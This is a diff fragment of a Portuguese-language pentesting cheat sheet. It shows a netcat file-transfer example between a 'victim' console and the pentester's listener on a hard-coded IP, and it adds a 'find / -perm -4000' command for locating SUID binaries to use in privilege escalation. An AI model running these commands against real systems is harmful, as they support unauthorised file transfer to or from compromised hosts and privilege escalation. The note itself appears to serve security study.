@@ -14,3 +14,6 @@ PYTHON -m http.server 8080
 NETCAT
 - nc pode ser utilizado para transferir arquivo com o  simbulos (<,>).
 - exemplo nc 52.237.27.64 666 > arquivo - console da vitima || nc -lvp 666 < arquivo - console do pentester.
+---------------------------------------------------------------------------------
+FIND / -perm -4000 2>/dev/null
+- encontra arquivos que o usuario tem permissao de rodar.
